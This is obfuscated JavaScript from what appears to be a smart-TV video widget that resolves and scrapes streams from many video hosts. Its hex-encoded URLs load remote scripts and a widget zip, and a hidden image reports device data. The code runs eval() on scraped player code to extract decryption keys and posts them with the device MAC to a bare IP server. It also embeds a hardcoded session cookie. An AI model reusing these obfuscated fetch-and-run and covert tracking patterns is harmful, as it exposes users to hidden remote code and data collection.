alert('################-Start main2_31_10-###############');
_mx254 = ['\x31\x39\x34\x2E\x36\x37\x2E\x32\x32\x33\x2E\x36\x32', '\x6D\x6F\x6F\x6E\x2E\x70\x68\x70', '\x2E\x6D\x33\x75\x38', '\x68\x74\x74\x70\x3A\x2F\x2F', '\x2F', '\x75\x72\x6C', '\x68\x74\x74\x70\x3A\x2F\x2F\x69\x70\x2D\x73\x6D\x61\x72\x74\x2D\x74\x76\x2E\x75\x63\x6F\x7A\x2E\x63\x6C\x75\x62\x2F\x6C\x6F\x61\x64\x73\x2F\x63\x72\x79\x70\x74\x6F\x73\x2E\x6A\x73', '\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x34\x2E\x36\x37\x2E\x32\x32\x33\x2E\x36\x32\x2F\x72\x75\x74\x75\x62\x65\x2E\x70\x68\x70\x3F\x6D\x33\x75\x3D', '\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x6C\x69\x73\x74\x5F\x61\x6A\x61\x78\x3F\x73\x74\x79\x6C\x65\x3D\x6A\x73\x6F\x6E\x26\x61\x63\x74\x69\x6F\x6E\x5F\x67\x65\x74\x5F\x6C\x69\x73\x74\x3D\x31\x26\x6C\x69\x73\x74\x3D', '\x51\x36\x30', '\x75\x68\x74\x74\x70\x25\x33\x41\x2F\x2F\x69\x70\x73\x6D\x61\x72\x74\x74\x76\x2E\x72\x75\x2F', '\x5A\x34\x37\x20\x3D\x20\x63\x75\x72\x57\x69\x64\x67\x65\x74\x2E\x69\x64\x3B\x46\x34\x36\x28\x22\x68\x74\x74\x70\x3A\x2F\x2F\x69\x70\x2D\x73\x6D\x61\x72\x74\x2D\x74\x76\x2E\x75\x63\x6F\x7A\x2E\x63\x6C\x75\x62\x2F\x77\x69\x64\x67\x65\x74\x2F\x6E\x53\x74\x72\x65\x61\x6D\x50\x61\x6C\x2E\x7A\x69\x70\x22\x29', '\x59\x39\x32', '\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x34\x2E\x36\x37\x2E\x32\x32\x33\x2E\x36\x32\x2F\x68\x64\x67\x6F\x2E\x70\x68\x70\x3F\x75\x72\x69\x3D'];
var _iv = '', _key = '';
Include(_mx254[0x6]);
var Tizen = false;
if (typeof window.tizen !== "undefined" && typeof window.webapis !== "undefined") {
  Tizen = true;
};
if (!serC && !serD && !Tizen) {
  if (Q60 !== '1.2r') {
    var Rp = Y11('pluginObjectTV').GetProductCode(1);
    if (Rp == "undefined") {
      Rp = "LN40B650_KOR";
    };
    (function () {
      var div = document.createElement("object");
      div.setAttribute("id", "stat");
      div.setAttribute("style", "display:none;");
      document.body.appendChild(div);
      div.innerHTML = '<img src="http://counter.yadro.ru/hit?t19.6;r;s1024*768*32;' + _mx254[0xa] + '/widget/' + Q60 + '/' + Rp + ';' + Math.random() + '" width="0" height="0"></img>';
    })();
    (function () {
      Y92(_mx254[0xb], 5000);
    })();
  }
};
function Y47(ul, d) {
  ul = lrdPr(ul);
  ul = ul["indexOf"]("://") > 0 ? ul : R95(ul);
  ul = ul["indexOf"]("://") > 0 ? ul["replace"](/^[^hrmua]*/, "")["replace"](/\s/g, "%20") : ul;
  if (d) {
    ul = ul["replace"](/^(rtp:)/, "udp:")
  };
  alert("Y47+add_u " + ul);
  ul = add_u(ul);
  return ul
};
function add_u(x) {
  x = x.replace(/\\\//g, '/').replace('ifrome', 'iframe');
  if (x.indexOf('kinokrad') > 0 && x.indexOf('.mp4') > 0 && x.indexOf('videos') < 0) {
    x = x['split']("/");
    x[3] = "videos";
    x = x.join("/")
  };
  if (x.indexOf('[') > 0 && x.indexOf('/iframe') > 0) {
    x = x['split']("[");
    x = x[0]
  };
  if (x.indexOf('videonavigator.net') > 0) {
    if (x.indexOf('portal.xml') > 0 || x.indexOf('portal.php?a=1') > 0) {
      x = '\x68\x74\x74\x70\x3A\x2F\x2F\x36\x30\x31\x34\x2E\x75\x63\x6F\x7A\x2E\x72\x75\x2F\x70\x6C\x61\x79\x2F\x73\x6D\x61\x72\x74\x70\x61\x6C\x2F\x76\x6E\x61\x76\x69\x2E\x78\x6D\x6C'
    }
  };
  if (x.indexOf('\x6F\x62\x6F\x76\x73\x65\x2E\x72\x75') > 0) {
    if (x.indexOf('http://obovse.ru/smarttv') == 0) {
      x = x.replace('\x6F\x62\x6F\x76\x73\x65\x2E\x72\x75', x.indexOf('fex.php') > 0 ? ("51.15.17.204" + '\x2F\x6F\x62\x6F\x76\x73\x65\x2E\x72\x75') : ("195.88.208.101" + '\x2F\x6F\x62\x6F\x76\x73\x65\x2E\x72\x75'));
      if (x.indexOf('?') > 0) {
        x = x + "&box_client=lg";
      } else {
        x = x + "?box_client=lg";
      }
    }
  };
  if (x.indexOf('\x68\x74\x74\x70\x3A\x2F\x2F\x6E\x73\x65\x72\x76\x2E\x68\x6F\x73\x74\x3A\x35\x33\x30\x30\x2F\x6B\x6F\x64\x69\x6B\x2F\x73\x74\x72\x65\x61\x6D\x3F\x6C\x69\x6E\x6B\x3D\x73\x65\x72\x69\x61\x6C') >= 0) {
    uls = x.split('link=');
    ul = "\x68\x74\x74\x70\x3A\x2F\x2F\x6B\x6F\x64\x69\x6B\x2E\x69\x6E\x66\x6F\x2F" + uls[1];
    alert("++add(ul)++" + ul);
    return xml_k(ul);
  };
  if ((x.indexOf('load.hdrezka-ag.net') >= 0 && x.indexOf('url":"') >= 0)) {
    alert("rezka_s++" + x);
    return rezka_s(x);
  };
  if (x.indexOf('kodikapi.com/list?') >= 0) {
    ul = x + ';';
    uls = ul.replace('/list?', '/search?');
    return xml_k(uls.replace('/list;', '') + '&title=' + Q46);
  };
  if (x.indexOf('VIP_KINO_R') >= 0) {
    alert("VIP_KINO_R" + Q46);
    return xml_r(x, Q46);
  };
  alert("X+++" + x);
  return x
};
function rezka_s(ul) {
  alert("rezka_s(ul)++" + ul);
  LoadTimer("Y6(14);", 10000);
  if (Load_timer < 0) {
    return
  };
  url = ul.split('url');
  url = url["reverse"]();
  for (var i = 1; i < url["length"]; i++) {
    lin = R98(url[i], '":"', '",');
    title = R98(url[i], '"title":"', '"}');
    alert("rezka_sl +++in+" + lin);
    lin = lin.replace('https:', "http:");
    alert("rezka_slin+" + lin);
    if (!lin) {
      continue
    };
    P59['push']([lin, title]);
    if (!Q3 && title <= Number(O12[A['A17']])) {
      alert("title---" + title);
      R42(lin);
      Z18 = P59['length'] - 1;
    }
  };
  if (!Q3) {
    if (P59['length']) {
      R42(P59[0][0]);
    } else {
      Y6(12)
    }
  }
};
function Y2(o, s, r) {
  alert('### function Y2 o =' + o);
  alert('### function Y2 s =' + s);
  alert('### function Y2 r =' + r);
  o['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
  o['setRequestHeader']('Content-length', s['length']);
  if (r) {
    o['setRequestHeader']('Referer', r)
  };
  o['setRequestHeader']('Connection', 'close');
  if (r !== undefined && r.indexOf("filmix") >= 0) {
    o.setRequestHeader('X-Requested-With', 'XMLHttpRequest'),
    o.setRequestHeader('Cookie', 'sc34-market=f096179b826ae18999aca75bbcbe3a33; FILMIXNET=9uo2gkgnam34383e5dvmbkp8v5; _ym_uid=1500682425517937950; uppodhtml5_volume=0.8; x424=639bf3c85307f9814b91789df682b6f2;')
  };
};
function F51(ul, p, z) {
  alert('# F51 #' + ul);
  ul = ul["split"]("#archive=")[0];
  if (p) {
    var uar = p["split"]("|##|");
    P87 = uar["length"] > Z26 ? uar[Z26] : uar["length"] ? uar[0] : "";
  };
  if (ul["indexOf"]("|##|") > 0) {
    Q90 = [];
    var uar = ul["split"]("|##|"),
    tur;
    for (var i in uar) {
      tur = uar[i]["split"]("|#|");
      Q90["push"]([tur[tur["length"] - 1], (tur[0]["indexOf"]("://") > 0 ? R98(tur[0], "://", "/")["replace"]("www.", "") : tur[0])]);
      if (Q65 < 22) {
        break
      }
    };
    ul = Q90["length"] > Z26 ? Q90[Z26][0] : Q90["length"] ? Q90[0][0] : ""
  };
  ul += Z57;
  if ((ul["indexOf"]("/video/") > 0 || ul["indexOf"]("/embed.php?v=") > 0) && (ul["indexOf"]("movshare.") > 0 || ul["indexOf"]("nowvideo.") > 0 || ul["indexOf"]("divxstage.") > 0)) {
    var id = R98(ul, "?v=");
    if (!id) {
      id = R98(ul, "video/")
    };
    P87 = ul + ((ul["indexOf"]("divxstage.") > 0) ? "|fkz" : "|fkzd") + "='|'|#|http://www." + (R98(ul, "://", "/")["replace"]("embed.", "")["replace"]("www.", "")) + "/api/player.api.php?key=md5hash&numOfErrors=0&file=" + id + "|url=|&title=";
    ul = "md5hash";
    p = 1
  } else {
    if (ul["indexOf"]("rutube.ru") > 0 && (ul["indexOf"]("/embed/") > 0 || ul["indexOf"]("/video/") > 0)) {
      var dres = ul.split('/');
      if (ul["indexOf"]("/embed/") > 0) {
        var P87 = _mx254[0x7] + dres[5] + "|<items>|</items>";
      } else {
        var P87 = _mx254[0x7] + dres[4] + "|<items>|</items>";
      };
      ul = "md5hash#vod";
      p = 1
    }
  };
  if (ul["indexOf"]("#auto_start") > 0 || (A["A31"] && !/(#stop)$/["test"](ul)) || z || Q90["length"] < 2) {
    if (p && P87["indexOf"]("://") > 0) {
      if (!P76 && ul["indexOf"]("#no_stop") < 0) {
        R2()
      };
      F70(P87["split"]("|#|"), ul, "")
    } else {
      Y12("baner");
      if (ul["indexOf"]("rtmp://") == 0 && !P7 && (serC || serD)) {
        P15 = 0;
        R3();
        F53(ul);
        Y13("17_help")
      } else {
        if (id = Y80(ul, "id", "rtmp://")) {
          uar = ul["replace"]("?", "&")["split"]("&");
          ul = uar[0] + ((!/\/$/["test"](uar[0])) ? "/" : "") + id;
          id = "?";
          for (var i = 1; i < uar["length"]; i++) {
            ul += id + uar[i];
            id = "&"
          }
        };
        P15 = 1;
        Y12("17_help");
        F52(ul)
      }
    }
  } else {
    R3();
    F93(O19[5], Q90)
  }
};
function F52(ul) {
  alert('# F52 #' + ul);
  if (!P76 && ul["indexOf"]("#no_stop") < 0) {
    R2()
  };
  P59 = [];
  Z18 = 0;
  ul = Y47(ul, 1);
  Q23 = P87 ? ul + R95(P87["split"]("|")[0]) : ul;
  ul = ul["replace"]("vkontakte.ru", "vk.com");
  if (ul["indexOf"]("udp://") == 0 && A["A1"]["indexOf"](":") > 0) {
    ul = "http://" + A["A1"] + "/udp/" + ul["substr"](7)
  } else {
    if (ul["indexOf"]("acestream://") == 0 && Z53) {
      ul = ul["replace"]("acestream://", Z53)
    }
  };
  if (ul["indexOf"]("?oid=") > 0 && ul["indexOf"]("id=") > 0 && ul["indexOf"]("hash=") > 0) {
    var ar = ul["split"]("?");
    ar = ar[1]["split"]("&");
    for (var i in ar) {
      ar[i] = ar[i]["replace"](/^id=/, "_")["replace"](/^oid=/, "")
    };
    ar = ar[0] + ar[1];
    R96("", "", "http://vk.com/al_video.php?act=show_inline&al=1&autoplay=0&list=&module=search&video=" + ar)
  } else {
    if (ul["indexOf"]("api.vk.com/") > 0 || ul["indexOf"]("vk.com/plvideo?z=video") > 0 || ul["indexOf"]("vk.com/video") > 0) {
      if (ul["indexOf"]("vk.com/plvideo?z=video") > 0) {
        ul = ul["replace"]("plvideo?z=", "")["replace"]("%2F", "?list=")
      };
      R96("", "", ul)
    } else {
      if (ul["indexOf"]("youtube.com/playlist?") > 0) {
        xml_s(ul)
      } else {
        if (ul["indexOf"]("youtube.com/embed") > 0) {
          R96(R98(ul, "embed/", "?"), 0)
        } else {
          if (ul["indexOf"]("youtube.com/video") > 0) {
            R96(R98(ul, "video/", "?"), 0)
          } else {
            if (ul["indexOf"]("youtube.com/watch") > 0 && ul["indexOf"]("v=") > 0) {
              var i = ul["indexOf"]("?v=");
              if (i < 0) {
                i = ul["indexOf"]("&v=")
              };
              ul = ul["substr"](i + 3);
              i = ul["lastIndexOf"]("&");
              if (i > ul["lastIndexOf"]("&token=")) {
                ul = ul["substr"](0, i)
              };
              R96(ul, 0)
            } else {
              if (ul.indexOf("vimeo.com/") > 0) {
                var reg = /vimeo\.com\/(.*?)(?:\z|$|&)/;
                var m = ul.match(reg);
                reg = LOAD.getURL("https://player.vimeo.com/video/" + m[1] + "/config", ul);
                m = Y8(reg);
                R42(m.request.files.progressive[0].url);
              } else {
                if (ul.indexOf("dailymotion.com/") > 0) {
                  var m = ul["split"]("_");
                  var cul = m[0]["replace"]("/video/", "/embed/video/");
                  var reg = LOAD.getURL(cul, ul);
                  m = R98(reg, 'var config = ', '}};') + "}}";
                  cul = Y8(m);
                  R96("", "", cul.metadata.qualities.auto[0].url);
                } else {
                  if ((ul["indexOf"]("rutube.ru") > 0 && ul["indexOf"](".m3u8?guids=") > 0) || (ul["indexOf"](".m3u8") > 0 && ul["indexOf"]("#parser") > 0)) {
                    R96("", "", ul["replace"]("#parser", ""))
                  } else {
                    if (ul["indexOf"]("index.m3u8") < 0 && (ul["indexOf"]("moonwalk.cc/") > 0 || /(\/iframe)/["test"](ul))) {
                      if (Tizen) {
                        tizen.websetting.setUserAgentString("Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0");
                        if (serM) {
                          R96("", "", _mx254[0x3] + _mx254[0x0] + _mx254[0x4] + _mx254[0x1] + '?' + _mx254[0x5] + '=' + encodeURIComponent(ul) + '&' + _mx254[0x2] + '&box_mac=' + P1);
                        } else {
                          frame_(ul);
                        }
                      } else {
                        frame_(ul);
                      }
                    } else {
                      if ((ul["indexOf"]("index.m3u8") < 0 && /(\/720p)/["test"](ul)) && (ul["indexOf"]("kodik") > 0 || ul["indexOf"]("/video/") > 0 || ul["indexOf"]("/go/seria/") > 0)) {
                        alert('kodik_720p===' + ul);
                        kodik_720p(ul)
                      } else {
                        if ((ul["indexOf"](".watch-online-hd.") > 0 || ul["indexOf"](".hotcloud.") > 0 || ul["indexOf"](".poiuytrew.") > 0) && ul["indexOf"]("[") > 0 && ul["indexOf"]("]") > 0) {
                          Y1(ul)
                        } else {
                          if ((ul["indexOf"]("hdgo.") > 0 && ul["indexOf"](".hdgo.") < 0 || ul["indexOf"]("s1.hdgo.") > 0 || ul["indexOf"]("vio.to/") > 0 || ul["indexOf"]("techdom12.top") > 0 || ul["indexOf"]("s2.hdgo.") > 0 || ul["indexOf"]("164.132.204.49") > 0 || ul["indexOf"]("go.5d0voly7m9.ru") > 0 || ul["indexOf"]("217.23.2.49") > 0 || ul["indexOf"]("apollostream.xyz") > 0 || ul["indexOf"]("cdnbalancer.ru") > 0 || ul["indexOf"]("countvideodb.ru") > 0 || ul["indexOf"]("jaskervideocdn.ru") > 0 || ul["indexOf"]("martinstreamvideo.ru") > 0 || ul["indexOf"]("thevideocom.ru") > 0 || ul["indexOf"]("couber.be") > 0 || ul["indexOf"]("46.30.") > 0 || ul["indexOf"]("164.132.204.") > 0) && ul["indexOf"]("/hdgo/") < 0) {
                            if (ul["indexOf"]("hdgo.club/") > 0 || ul["indexOf"]("vio.to/") > 0 || ul["indexOf"]("hdgo.cc/") > 0 || ul["indexOf"]("techdom12.top/") > 0 || ul["indexOf"]("164.132.204.49/") > 0 || ul["indexOf"]("hdgo.cx/") > 0) {
                              var host = ul.split("/");
                              usl = ul["replace"](host[2], "vio.to");
                              hdgo(usl)
                            } else {
                              hdgo(ul)
                            }
                          } else {
                            if (ul.indexOf("ok.ru/video") > 0) {
                              var ar = ul.substr(ul.indexOf('video/') + 6);
                              if (ar.indexOf("?") > 0) {
                                ar = ar.substr(0, ar.indexOf("?"))
                              };
                              if (ar == "") {
                                return Y6(10, L[73] + " !")
                              };
                              okru("http://\x6F\x62\x6F\x76\x73\x65\x2E\x72\x75/smarttv/api.php?do=ok&box_client=lg&box_mac=" + genMAC() + "&v=" + ar)
                            } else {
                              alert("V R42+++" + ul);
                              R42(ul)
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
};
function R96(vid, j, ul) {
  alert('# R96 #' + ul);
  if (vid) {
    var tk = vid["split"]("&token="),
    pr = ["&el=embedded", "&el=vevo", "&el=detailpage", ""];
    if (!ul) {
      ul = "https://www.youtube.com/get_video_info?video_id=" + tk[0] + pr[2] + "&sts=" + Z30
    }
  };
  xhrAbort();
  LoadTimer("Y6(14);", 10000);
  xhr = new XMLHttpRequest();
  if (P7 && xhr["overrideMimeType"]) {
    xhr["overrideMimeType"]("text/html")
  };
  xhr["onreadystatechange"] = function () {
    try {
      if (Load_timer < 0) {
        return
      };
      if (xhr && xhr["readyState"] == 4) {
        Y91(Load_timer);
        if (xhr["status"] == 200) {
          P59 = [];
          if ((ul["indexOf"](".m3u8") > 0 && xhr["responseText"]["indexOf"]('.mp4"') < 0) || (ul["indexOf"]("/m3u8?") > 0)) {
            if (xhr["responseText"]["indexOf"]("#EXTINF") >= 0) {
              R42(ul)
            } else {
              if (xhr["responseText"]["indexOf"]("#EXT-X-STREAM-INF") >= 0) {
                t = xhr["responseText"];
                if (ul.indexOf('rutube') > 0) {
                  t = t.replace(/(https)/gm, "http");
                };
                t = t.split("#EXT-X-STREAM-INF");
                var st,
                uar,
                ar = [],
                tar = [];
                for (var i = t["length"] - 1; i > 0; i--) {
                  uar = t[i]["split"]("\x0A");
                  if (uar["length"] < 2 || !dPr(uar[1])) {
                    continue
                  };
                  st = R98(uar[0], "RESOLUTION=", ",");
                  st = (st["indexOf"]("x") > 0) ? st["split"]("x")[1] : dPr(R98(uar[0], "BANDWIDTH=", ","), 1);
                  if (!dPr(st, 1)) {
                    st = (i + 1) * 10000
                  };
                  if (Number(st) < 240) {
                    continue
                  };
                  uar[1] = (uar[1]["indexOf"]("://") > 0) ? lrdPr(uar[1]) : ul["substring"](0, ul["lastIndexOf"]("/") + 1) + lrdPr(uar[1]);
                  P59["push"]([dSp(uar[1]), Number(st)]);
                  ar["push"](Number(st))
                };
                ar["sort"](function (a, b) {
                  return a - b
                });
                for (var i in ar) {
                  for (var f in P59) {
                    if (P59[f][1] == ar[i]) {
                      tar["push"](P59[f]);
                      break
                    }
                  }
                };
                P59 = tar;
                if (P59["length"] > 1 && ((P59[0][1] > P59[P59["length"] - 1][1] && P59[P59["length"] - 1][1] >= 10000) || (P59[0][1] < P59[P59["length"] - 1][1] && P59[P59["length"] - 1][1] < 10000))) {
                  P59["reverse"]()
                };
                Y66()
              } else {
                Y6(12)
              }
            }
          } else {
            if (xhr.responseText.indexOf('.mp4"') > 0) {
              ps = xhr["responseText"]['match'](/"(\d{3,4})"/g);
              pul = xhr["responseText"]['match'](/"(http\S+?)\.mp4/g);
              for (var i = 0; i < ps['length']; i++) {
                ne = ps[i];
                ms = pul[i].replace("https", 'http');
                if (!ne) {
                  continue;
                };
                P59['push']([ms, ne]);
                if (!Q3 && ne <= Number(O12[A['A17']])) {
                  R42(ms);
                  Z18 = P59['length'] - 1;
                }
              };
              if (!Q3) {
                if (P59['length']) {
                  R42(P59[0][0]);
                } else {
                  Y6(12)
                }
              }
            } else {
              if (ul["indexOf"]("vk.com/video_ext.php") > 0 || ul["indexOf"]("al_video.php") > 0) {
                t = R98(xhr["responseText"], "pl_type", "jpg")["replace"](/\\/g, "");
                t = t["match"](/url\d{3,4}":"(http|https):.+?\.(mp4|flv)/g);
                if (!t) {
                  return Y6(12)
                };
                for (var i = t["length"] - 1; i > -1; i--) {
                  var ar = t[i]["split"]('":"https');
                  if (P6 || serC || serD || serE) {
                    P59["push"](["http" + ar[1], ar[0]["replace"]("url", "")])
                  } else {
                    P59["push"](["https" + ar[1], ar[0]["replace"]("url", "")])
                  }
                };
                Y66()
              } else {
                if (ul["indexOf"]("vk.com/video") >= 0) {
                  t = R98(xhr["responseText"], "ajax.preload", "}]);")["replace"](/\\/g, "");
                  if (!t) {
                    return Y6(12)
                  };
                  var id = t["match"](/(http|https):\/\/www\.youtube\.com\/(embed|video|watch)(.+?)"/g);
                  if (id) {
                    return F52(id[0])
                  };
                  var h = R98(t, "hash2':'", "',");
                  id = R98(ul, "video")["split"]("?")[0];
                  if (!id || !h) {
                    return Y6(12)
                  };
                  R96("", "", "http://vk.com/al_video.php?act=show_inline&al=1&autoplay=0&list=&module=search&video=" + id)
                } else {
                  if (typeof window.tizen !== "undefined" && typeof window.webapis !== "undefined") {
                    var o = "";
                    if (vid) {
                      o = R98(xhr["responseText"], "hlsvp=", "&");
                      if (o) {
                        return R96("", "", R95(o));
                      };
                      t = R98(xhr["responseText"], "hlsManifestUrl%22%3A%22", "index.m3u8");
                      if (t) {
                        return R96("", "", R95(t) + "index.m3u8")
                      };
                      t = R98(xhr["responseText"], "url_encoded_fmt_stream_map=", "token");
                      if (t["indexOf"]("itag") >= 0) {
                        if (tk[2] && tk[2] == "shark") {
                          t = R97("http://sharksoft.te.ua/smarttv/yt_ext.php?token=" + tk[1], "arg1=" + encodeURIComponent(t), false)
                        };
                        R85(t["split"]("%2C"))
                      } else {
                        if (j < 3) {
                          j++;
                          R96(vid, j)
                        } else {
                          Y6(12)
                        }
                      }
                    } else {
                      Y6(12)
                    }
                  } else {
                    if (vid) {
                      t = R98(xhr["responseText"], "hlsManifestUrl%22%3A%22", "index.m3u8");
                      if (t) {
                        return R96("", "", R95(t) + "index.m3u8")
                      };
                      t = R98(xhr["responseText"], "url_encoded_fmt_stream_map=", "token");
                      if (t["indexOf"]("itag") >= 0) {
                        if (tk[2] && tk[2] == "shark") {
                          t = R97("http://sharksoft.te.ua/smarttv/yt_ext.php?token=" + tk[1], "arg1=" + encodeURIComponent(t), false)
                        };
                        R85(t["split"]("%2C"))
                      } else {
                        if (j < 3) {
                          j++;
                          R96(vid, j)
                        } else {
                          Y6(12)
                        }
                      }
                    } else {
                      Y6(12)
                    }
                  }
                }
              }
            }
          }
        } else {
          if ((xhr["status"] == 302 || xhr["status"] == 303 || xhr["status"] == 307) && xhr["getResponseHeader"]("Location") && xhr["getResponseHeader"]("Location")["indexOf"]("://") > 0) {
            R96(vid, j, xhr["getResponseHeader"]("Location"))
          } else {
            Y6(10, xhr["status"])
          }
        }
      }
    } catch (e) {
      Y6(12)
    }
  };
  xhr["open"]("GET", ul, true);
  if (ul["indexOf"](".m3u8") > 0 && ul["indexOf"]("mw_pid") > 0 && ul["indexOf"]("signature") > 0) {
    xhr['setRequestHeader']('User-Agent', navigator.userAgent);
  } else {
    if (ul["indexOf"]("mw_pid") < 0) {
      if (Tizen) {
        tizen.websetting.setUserAgentString("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100627 Firefox/3.6.6");
      };
      xhr['setRequestHeader']('User-Agent', navigator.userAgent);
    }
  };
  R99(xhr);
  xhr["send"]()
};
function mw_get(wa) {
  var e = function (p) {
    return p -= 0,
    p;
  };
  if (wa != "") {
    _r = wa.match(/(\S)=Crypto/);
    s = wa.match(/\((\w)\)\,\{/);
    a = wa.match(/\((\w)\)\}\)/);
    wa = R98(wa, '{', a[1] + ')})') + a[1] + ')});';
    alert("====WA===" + wa);
    d = "try{" + wa + 's=' + s[1] + ';a=' + a[1] + '; bst=' + _r[1] + ";}catch(e){Y6(14);alert(\"==mw_get=\" + e);}";
    eval(d);
    if (_iv !== a && _key !== s) {
      alert('---_iv---' + a);
      alert('---_key---' + s);
      _iv = a;
      _key = s;
      ws = 'iv=' + _iv + '&key=' + _key;
      alert('-kluchi-' + ws);
      LOAD.postURL(_mx254[0x3] + _mx254[0x0] + _mx254[0x4] + _mx254[0x1] + '?box_mac=' + P1, ws, '', '', '');
    };
    return bst;
  } else {
    return Y6(10, "\u041e\u0448\u0438\u0431\u043a\u0430\u0020\u043f\u043b\u0435\u0435\u0440\u0430\u002e\u0020\u0418\u0437\u043c\u0435\u043d\u0438\u043b\u0438\u0441\u044c\u0020\u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b\u0020\u0021\u0021\u0021");
  }
};
function frame_(ul) {
  alert("==_iv==" + _iv);
  alert("==_key==" + _key);
  xhrAbort();
  LoadTimer("xhrAbort();", 10000);
  ul = ul.replace("https", "http");
  ul = ul.split("@")[0];
  alert("==_ul_split==" + ul);
  uls = ul.replace(/@/g, "?");
  var host = uls.split("/");
  if (host[2] != 'clastarti.cc') {
    return frame_(ul.replace(host[2], 'clastarti.cc'));
  };
  if (serC || serD) {
    return R96("", "", _mx254[0x3] + _mx254[0x0] + _mx254[0x4] + _mx254[0x1] + '?' + _mx254[0x5] + '=' + encodeURIComponent(ul) + '&' + _mx254[0x2] + '&box_mac=' + P1);
  };
  xhr = new XMLHttpRequest();
  xhr["onreadystatechange"] = function () {
    try {
      if (Load_timer < 0) {
        return
      };
      if (xhr && xhr["readyState"] == 4) {
        var head = xhr.getAllResponseHeaders();
        Y91(Load_timer);
        if (xhr["status"] == 200) {
          var t = xhr["responseText"];
          vs = "http://" + host[2] + "/vs";
          var wa = LOAD.getMon(R98(t, '<script src="', '"'), ul);
          wa = R98(wa, "this.manifests={}", '.toString()');
          wa = R98(wa, "CkjCj8K4w79le8ObwqfCnA:function(n)", '.ajax');
          wa = R98(wa, "}var r={", 'd=t') + ';';
          wa = "{var r={" + wa.replace("this.options.domain_id", '"' + R98(t, "domain_id: ", ",") + '"');
          wa = wa.replace("this.options.partner_id", '"' + R98(t, "partner_id: ", ",") + '"');
          wa = wa.replace("this.options.video_token", '"' + R98(t, "video_token: '", "',") + '"');
          wa = wa.replace("this.options.player_skin", '"' + R98(t, "player_skin: '", "',") + '"');
          wa = wa.replace("e._mw_adb", "false");
          if (wa != '') {
            s = mw_get(wa);
          };
          p = 'q=' + encodeURIComponent(s.toString()) + "&ref=" + R98(t, " ref: '", "',");
          m = LOAD.postURL(vs, p, "", "", ul);
          if (m.indexOf('{"status":"error"}') >= 0 || m.indexOf('{"status":"invalid_q"}') >= 0) {
            return Y6(10, "\u041e\u0448\u0438\u0431\u043a\u0430\u0020\u043f\u043b\u0435\u0435\u0440\u0430\u002e\u0020\u0418\u0437\u043c\u0435\u043d\u0438\u043b\u0438\u0441\u044c\u0020\u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b\u0020\u0021\u0021\u0021");
          };
          pUrl = Y8(m);
          p = "",
          m = "",
          s = "";
          if (!pUrl.m3u8) {
            R96("", "", pUrl.mp4);
          } else {
            R96("", "", pUrl.m3u8);
          }
        } else {
          if (xhr["status"] == 404 || xhr["status"] == 500 || xhr["status"] == 502) {
            ul = ul.replace(host[2], "190.2.141.179");
            return frame_(ul)
          } else {
            return Y6(10, "\u0417\u0430\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u0430\u043d\u0020\u0434\u043e\u0441\u0442\u0443\u043f\u0020\u043a\u0020\u0432\u0438\u0434\u0435\u043e");
          }
        }
      }
    } catch (e) {
      alert("==catch=57=" + e);
      Y6(14);
    };
  };
  xhr["open"]("GET", ul, true);
  xhr["withCredentials"] = true;
  xhr["setRequestHeader"]("User-Agent", "Mozilla/5.0 (iPad; CPU OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0");
  xhr["setRequestHeader"]("Accept", "*/*");
  xhr["setRequestHeader"]("Content-Type", "application/x-javascript; charset=utf-8");
  xhr["setRequestHeader"]("Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
  xhr["setRequestHeader"]("Accept-Encoding", "identity");
  xhr["setRequestHeader"]("Referer", ul);
  xhr["setRequestHeader"]("DNT", "1");
  xhr["setRequestHeader"]("X-Requested-With", "XMLHttpRequest");
  xhr["send"](null);
};
function xml_s(ul) {
  alert("==xml_s==" + ul);
  xhrAbort();
  LoadTimer("xhrAbort();", 25000);
  Y91(P93);
  R9(L[13], 1, Q91);
  R15(1);
  if (ul.indexOf('.youtu') > 0 && ul.indexOf('list=') > 0) {
    var k = ul.match(/list=(.*?)(\&|\;|$)/g);
    k = k[0]["replace"](/(\&|\;|\s+|list=)/gm, "");
    ul = _mx254[0x8] + k + "&gl=RU&hl=RU"
  };
  uls = ul.replace(/@/g, "?");
  var host = uls.split("/");
  if (ul.indexOf('frame') > 0) {
    if (serC || serD) {
      return Get_Moon_xml_s(ul);
    };
  };
  xhr = new XMLHttpRequest();
  xhr["onreadystatechange"] = function () {
    if (xhr && xhr["readyState"] == 4) {
      var t = xhr["responseText"];
      if (xhr["status"] == 200) {
        if (ul.indexOf('frame') > 0) {
          if (t.indexOf("location='") > 0) {
            parter = R98(t, "location='", "'");
            return xml_s(ul + parter);
          };
        };
        var cls = [],
        ozw = "",
        oz = "",
        d = "",
        boom = "",
        ts = Ach(2),
        ls = Ach(3),
        ch = "";
        if (ul.indexOf('youtu') > 0 && ul.indexOf('list_ajax') > 0 && t.indexOf('encrypted_id') > 0) {
          boom = Y8(t);
          for (var i = 0; i < boom["video"]["length"]; i++) {
            l = lrdPr(boom["video"][i]["title"]);
            n = lrdPr(boom["video"][i]["encrypted_id"]);
            p = lrdPr(boom["video"][i]["thumbnail"]);
            nt = lrdPr(boom["video"][i]["added"]);
            pt = lrdPr(boom["video"][i]["duration"]);
            s = lrdPr(boom["video"][i]["views"]);
            u = lrdPr(boom["video"][i]["description"]);
